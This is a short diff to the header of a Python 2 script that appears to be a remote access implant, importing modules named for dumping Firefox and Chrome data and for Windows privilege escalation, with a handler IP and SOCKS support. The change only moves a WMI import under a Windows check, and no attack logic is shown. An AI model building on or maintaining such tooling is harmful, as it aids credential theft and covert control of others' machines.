@@ -1,15 +1,16 @@
 #!/usr/bin/env python2
-import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil, zlib, glob, select, sys, Queue, ctypes, string, wmi
+import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil, zlib, glob, select, sys, Queue, ctypes, string
 from Crypto.Cipher import AES
 from twisted.internet import reactor
 from twisted.protocols import socks
 import dumpff
 if os.name =="nt":
-	import dumpchrome, win32net, pupy_privesc
+	import dumpchrome, win32net, pupy_privesc, wmi
 
 
 HANDLER_IP = "127.0.0.1"
-c = wmi.WMI()
+if os.name == "nt":
+    c = wmi.WMI()
 
 def windows_only(func):
 	def tester(*args):
